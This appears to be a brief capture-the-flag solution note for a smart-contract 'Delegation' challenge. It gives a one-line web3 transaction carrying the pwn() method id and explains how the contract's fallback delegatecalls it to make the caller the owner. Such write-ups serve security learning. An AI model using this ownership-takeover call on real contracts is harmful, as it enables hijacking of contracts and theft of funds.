```javascript
web3.eth.sendTransaction({from: player, to: contract.address, data: "0xdd365b8b"})
```

0xdd365b8b is the method id of pwn()
Delegation contract do not have function pwn(), fall to fallback function
and it call the pwn() function at Delegate function which update msg.sender to owner